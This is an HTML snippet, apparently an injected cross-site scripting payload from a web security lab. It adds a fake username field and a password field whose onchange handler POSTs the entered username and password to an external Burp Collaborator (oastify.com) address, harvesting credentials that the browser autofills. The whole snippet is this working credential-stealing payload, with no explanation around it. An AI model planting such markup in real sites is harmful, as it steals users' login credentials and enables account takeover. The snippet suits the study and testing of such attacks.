<input name=username id=username>
<input type=password name=password_input onchange="if(this.value.length)fetch('https://8mvaqyiht3xsxifd01pcfqbuqlwgk5.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">